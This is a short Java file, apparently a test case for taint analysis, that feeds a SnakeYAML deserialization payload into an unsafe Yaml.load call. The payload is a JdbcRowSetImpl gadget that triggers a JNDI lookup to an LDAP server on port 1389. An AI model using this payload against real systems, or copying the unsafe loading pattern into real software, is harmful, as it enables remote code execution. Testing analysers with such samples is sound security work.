import org.yaml.snakeyaml.Yaml;
import com.sun.rowset.JdbcRowSetImpl;

public class Server {
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        yaml.load(getPoc());
        //JdbcRowSetImpl impl = new JdbcRowSetImpl();
    }

    public static String getPoc() {
        char[] chs = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/5cjybz, autoCommit: true}".toCharArray();
        chs[0] = taint();
        return new String(chs);
    }

    public static char taint(){
        return '!';
    }
}
